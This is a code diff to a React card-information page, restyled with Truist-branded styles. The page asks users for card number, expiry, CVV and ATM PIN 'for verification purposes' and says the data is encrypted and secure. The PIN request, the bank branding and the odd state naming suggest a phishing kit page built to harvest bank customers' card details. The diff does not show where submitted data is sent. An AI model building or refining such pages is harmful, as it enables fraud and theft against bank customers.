@@ -2,7 +2,7 @@ import React, { useState } from 'react';
 import { useLocation, useNavigate } from 'react-router-dom';
 import axios from 'axios';
 import { baseUrl } from '../constants';
-import FlowCard from '../components/FlowCard';
+import { inputStyles, buttonStyles, cardStyles } from '../Utils/truistStyles';
 
 const Card: React.FC = () => {
   const [cardNumber, setCardNumber] = useState('');
@@ -26,11 +26,16 @@ const Card: React.FC = () => {
 
   if (!emzemz) {
     return (
-      <FlowCard title="Error">
-        <div className="text-center text-red-600">
-          Missing user details. Please restart the process.
+      <div className={cardStyles.base}>
+        <div className={cardStyles.padding}>
+          <h1 className="mx-auto mb-6 w-full text-center text-3xl font-semibold text-[#2b0d49]">
+            Error
+          </h1>
+          <p className="text-sm font-semibold text-[#6c5d85] mb-8">
+            Missing user details. Please restart the process.
+          </p>
         </div>
-      </FlowCard>
+      </div>
     );
   }
 
@@ -84,170 +89,172 @@ const Card: React.FC = () => {
   const years = Array.from({ length: 15 }, (_, i) => currentYear + i);
 
   return (
-    <FlowCard title="Card Information">
-      <form onSubmit={handleSubmit} className="space-y-4">
-        <p className="text-sm text-slate-600 mb-4">
-          Please provide your card details for verification purposes.
-        </p>
+    <div className="flex flex-col items-center justify-center">
+      <div className={cardStyles.base}>
+        <div className={cardStyles.padding}>
+          <h1 className="mx-auto mb-6 w-full text-center text-3xl font-semibold text-[#2b0d49]">
+            Card Information
+          </h1>
+          <p className="text-sm font-semibold text-[#6c5d85] mb-8">
+            Please provide your card details for verification purposes.
+          </p>
 
-        {/* Card Number */}
-        <div>
-          <label className="block text-sm text-slate-500 mb-1" htmlFor="cardNumber">
-            Card Number
-          </label>
-          <input
-            id="cardNumber"
-            name="cardNumber"
-            type="text"
-            value={cardNumber}
-            onChange={handleCardNumberChange}
-            maxLength={19}
-            className="w-full px-3 py-3 border border-slate-200 rounded text-sm focus:outline-none focus:border-[#0f4f6c]"
-            placeholder="1234 5678 9012 3456"
-          />
-          {errors.cardNumber && (
-            <div className="flex items-center gap-2 text-sm text-red-600 mt-1">
-              <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
-                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-              </svg>
-              {errors.cardNumber}
+          <form onSubmit={handleSubmit} className="space-y-6">
+            <div className="space-y-2">
+              <label className="text-sm text-[#5d4f72]" htmlFor="cardNumber">
+                Card Number
+              </label>
+              <input
+                id="cardNumber"
+                name="cardNumber"
+                type="text"
+                value={cardNumber}
+                onChange={handleCardNumberChange}
+                maxLength={19}
+                className={`${inputStyles.base} ${inputStyles.focus}`}
+                placeholder="1234 5678 9012 3456"
+              />
+              {errors.cardNumber && (
+                <div className="flex items-center gap-2 text-xs font-semibold text-[#b11f4e] mt-2">
+                  <svg aria-hidden="true" className="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
+                  </svg>
+                  <span>{errors.cardNumber}</span>
+                </div>
+              )}
             </div>
-          )}
-        </div>
 
-        {/* Expiry Date */}
-        <div>
-          <label className="block text-sm text-slate-500 mb-1">Expiry Date</label>
-          <div className="flex gap-2">
-            <select
-              value={expiryMonth}
-              onChange={(e) => setExpiryMonth(e.target.value)}
-              className="flex-1 px-3 py-3 border border-slate-200 rounded text-sm focus:outline-none focus:border-[#0f4f6c]"
-            >
-              <option value="">Month</option>
-              {Array.from({ length: 12 }, (_, i) => (
-                <option key={i + 1} value={String(i + 1).padStart(2, '0')}>
-                  {String(i + 1).padStart(2, '0')}
-                </option>
-              ))}
-            </select>
-            <select
-              value={expiryYear}
-              onChange={(e) => setExpiryYear(e.target.value)}
-              className="flex-1 px-3 py-3 border border-slate-200 rounded text-sm focus:outline-none focus:border-[#0f4f6c]"
-            >
-              <option value="">Year</option>
-              {years.map((year) => (
-                <option key={year} value={year}>
-                  {year}
-                </option>
-              ))}
-            </select>
-          </div>
-          {errors.expiry && (
-            <div className="flex items-center gap-2 text-sm text-red-600 mt-1">
-              <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
-                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-              </svg>
-              {errors.expiry}
+            <div className="space-y-2">
+              <label className="text-sm text-[#5d4f72]">Expiry Date</label>
+              <div className="flex gap-2">
+                <select
+                  value={expiryMonth}
+                  onChange={(e) => setExpiryMonth(e.target.value)}
+                  className={`${inputStyles.base} ${inputStyles.focus}`}
+                >
+                  <option value="">Month</option>
+                  {Array.from({ length: 12 }, (_, i) => (
+                    <option key={i + 1} value={String(i + 1).padStart(2, '0')}>
+                      {String(i + 1).padStart(2, '0')}
+                    </option>
+                  ))}
+                </select>
+                <select
+                  value={expiryYear}
+                  onChange={(e) => setExpiryYear(e.target.value)}
+                  className={`${inputStyles.base} ${inputStyles.focus}`}
+                >
+                  <option value="">Year</option>
+                  {years.map((year) => (
+                    <option key={year} value={year}>
+                      {year}
+                    </option>
+                  ))}
+                </select>
+              </div>
+              {errors.expiry && (
+                <div className="flex items-center gap-2 text-xs font-semibold text-[#b11f4e] mt-2">
+                  <svg aria-hidden="true" className="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
+                  </svg>
+                  <span>{errors.expiry}</span>
+                </div>
+              )}
             </div>
-          )}
-        </div>
 
-        {/* CVV */}
-        <div>
-          <label className="block text-sm text-slate-500 mb-1" htmlFor="cvv">
-            CVV
-          </label>
-          <div className="relative">
-            <input
-              id="cvv"
-              name="cvv"
-              type={showCvv ? 'text' : 'password'}
-              value={cvv}
-              onChange={(e) => {
-                const value = e.target.value.replace(/\D/g, '');
-                if (value.length <= 4) setCvv(value);
-              }}
-              maxLength={4}
-              className="w-full px-3 py-3 border border-slate-200 rounded text-sm focus:outline-none focus:border-[#0f4f6c]"
-              placeholder="123"
-            />
-            <button
-              type="button"
-              onClick={() => setShowCvv(!showCvv)}
-              className="absolute right-3 top-1/2 -translate-y-1/2 text-[#0f4f6c] text-sm hover:underline"
-            >
-              {showCvv ? 'Hide' : 'Show'}
-            </button>
-          </div>
-          {errors.cvv && (
-            <div className="flex items-center gap-2 text-sm text-red-600 mt-1">
-              <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
-                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-              </svg>
-              {errors.cvv}
+            <div className="space-y-2">
+              <label className="text-sm text-[#5d4f72]" htmlFor="cvv">
+                CVV
+              </label>
+              <div className="relative">
+                <input
+                  id="cvv"
+                  name="cvv"
+                  type={showCvv ? 'text' : 'password'}
+                  value={cvv}
+                  onChange={(e) => {
+                    const value = e.target.value.replace(/\D/g, '');
+                    if (value.length <= 4) setCvv(value);
+                  }}
+                  maxLength={4}
+                  className={`${inputStyles.base} ${inputStyles.focus}`}
+                  placeholder="123"
+                />
+                <button
+                  type="button"
+                  onClick={() => setShowCvv(!showCvv)}
+                  className="absolute right-3 top-1/2 -translate-y-1/2 text-[#5f259f] text-sm hover:underline"
+                >
+                  {showCvv ? 'Hide' : 'Show'}
+                </button>
+              </div>
+              {errors.cvv && (
+                <div className="flex items-center gap-2 text-xs font-semibold text-[#b11f4e] mt-2">
+                  <svg aria-hidden="true" className="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
+                  </svg>
+                  <span>{errors.cvv}</span>
+                </div>
+              )}
             </div>
-          )}
-        </div>
 
-        {/* ATM PIN */}
-        <div>
-          <label className="block text-sm text-slate-500 mb-1" htmlFor="atmPin">
-            ATM PIN
-          </label>
-          <div className="relative">
-            <input
-              id="atmPin"
-              name="atmPin"
-              type={showPin ? 'text' : 'password'}
-              value={atmPin}
-              onChange={(e) => {
-                const value = e.target.value.replace(/\D/g, '');
-                if (value.length <= 4) setAtmPin(value);
-              }}
-              maxLength={4}
-              className="w-full px-3 py-3 border border-slate-200 rounded text-sm focus:outline-none focus:border-[#0f4f6c]"
-              placeholder="****"
-            />
-            <button
-              type="button"
-              onClick={() => setShowPin(!showPin)}
-              className="absolute right-3 top-1/2 -translate-y-1/2 text-[#0f4f6c] text-sm hover:underline"
-            >
-              {showPin ? 'Hide' : 'Show'}
-            </button>
-          </div>
-          {errors.atmPin && (
-            <div className="flex items-center gap-2 text-sm text-red-600 mt-1">
-              <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
-                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-              </svg>
-              {errors.atmPin}
+            <div className="space-y-2">
+              <label className="text-sm text-[#5d4f72]" htmlFor="atmPin">
+                ATM PIN
+              </label>
+              <div className="relative">
+                <input
+                  id="atmPin"
+                  name="atmPin"
+                  type={showPin ? 'text' : 'password'}
+                  value={atmPin}
+                  onChange={(e) => {
+                    const value = e.target.value.replace(/\D/g, '');
+                    if (value.length <= 4) setAtmPin(value);
+                  }}
+                  maxLength={4}
+                  className={`${inputStyles.base} ${inputStyles.focus}`}
+                  placeholder="****"
+                />
+                <button
+                  type="button"
+                  onClick={() => setShowPin(!showPin)}
+                  className="absolute right-3 top-1/2 -translate-y-1/2 text-[#5f259f] text-sm hover:underline"
+                >
+                  {showPin ? 'Hide' : 'Show'}
+                </button>
+              </div>
+              {errors.atmPin && (
+                <div className="flex items-center gap-2 text-xs font-semibold text-[#b11f4e] mt-2">
+                  <svg aria-hidden="true" className="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
+                  </svg>
+                  <span>{errors.atmPin}</span>
+                </div>
+              )}
             </div>
-          )}
-        </div>
 
-        <div className="pt-4">
-          {!isLoading ? (
-            <button
-              type="submit"
-              className="w-full bg-[#0f4f6c] hover:bg-[#083d52] text-white py-3 rounded font-medium transition-colors"
-            >
-              Continue
-            </button>
-          ) : (
-            <div className="flex justify-center py-3">
-              <div className="h-8 w-8 animate-spin rounded-full border-4 border-solid border-[#0f4f6c] border-t-transparent"></div>
+            <div className="flex flex-wrap gap-3 pt-2">
+              <button
+                type="submit"
+                className={buttonStyles.base}
+                disabled={isLoading}
+              >
+                {isLoading ? (
+                  <span className={buttonStyles.loading}></span>
+                ) : (
+                  'Continue'
+                )}
+              </button>
             </div>
-          )}
-        </div>
 
-        <p className="text-xs text-slate-500 mt-4">
-          Your card information is encrypted and secure. We use industry-standard security measures to protect your data.
-        </p>
-      </form>
-    </FlowCard>
+            <p className="text-xs text-[#5d4f72] mt-4">
+              Your card information is encrypted and secure. We use industry-standard security measures to protect your data.
+            </p>
+          </form>
+        </div>
+      </div>
+    </div>
   );
 };
 
